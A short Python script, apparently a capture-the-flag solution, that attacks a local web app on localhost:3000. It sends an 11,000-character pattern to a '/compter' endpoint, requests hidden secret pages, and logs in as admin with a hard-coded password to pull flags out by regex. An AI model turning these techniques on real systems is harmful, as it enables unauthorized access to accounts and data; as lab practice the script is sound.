import re
import requests

def get_message_flag(
        login_url,
        flag_url,
        fieldName1,
        fieldcontent1,
        fieldName2,
        fieldcontent2,
        regex_pattern
):
    result = []
    credentials = {
        fieldName1: fieldcontent1,
        fieldName2: fieldcontent2
    }
    session = requests.Session()
    login_response = session.post(login_url, json=credentials)
    login_result = login_response.json()
    result = re.findall(regex_pattern, login_response.text)
    flag_response = session.post(flag_url, json={"sessionId": login_result.get("sessionId")})
    result = result + re.findall(regex_pattern, flag_response.text)
    print(result)

def exploit():
    url = "http://localhost:3000"
    re_pattern = r'\b[a-zA-Z_]*_[a-zA-Z_]*_[a-zA-Z_]*_[a-zA-Z_]*\b'

    print("flag1:")
    get_message_flag(
        login_url=f"{url}/compter",
        flag_url=f"{url}/compter",
        fieldName1="text",
        fieldcontent1="a",
        fieldName2="pattern",
        fieldcontent2="0" * 11000,
        regex_pattern=re_pattern
    )
    print("\nflag2:")
    page2 = requests.get(url+ '/secret_page_that_definitely_doesnt_have_a_flag_hide_inside')
    content2 = page2.text
    print(re.findall(re_pattern, content2))

    print("\nflag3:")
    page3 = requests.get(url+ '/secret.html')
    content3 = page3.text
    print(re.findall(re_pattern, content3))

    print("\nflag4:")
    get_message_flag(url+"/login",
                     url+"/get-admin-flag",
         "username",
         "admin",
         "password",
         "759319",
         regex_pattern=re_pattern)


if __name__ == "__main__":
    exploit()